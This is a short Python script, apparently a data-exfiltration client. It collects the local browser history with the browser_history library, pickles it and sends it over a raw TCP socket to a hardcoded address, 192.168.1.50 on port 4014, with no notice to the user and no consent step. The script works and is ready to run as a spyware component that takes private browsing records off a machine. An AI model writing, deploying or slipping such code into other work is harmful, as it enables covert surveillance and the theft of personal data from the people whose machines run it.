import socket
import pickle
from browser_history import get_history







outputs = get_history()


his = outputs.histories


def send_tuple(server_ip, server_port, data_tuple):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    serialized_data = pickle.dumps(data_tuple)

    client_socket.sendall(len(serialized_data).to_bytes(4, byteorder='big'))

    client_socket.sendall(serialized_data)

    client_socket.close()
    print("Tuple sent successfully.")

if __name__ == "__main__":
    server_ip = "192.168.1.50"
    server_port = 4014
    

    send_tuple(server_ip, server_port, his)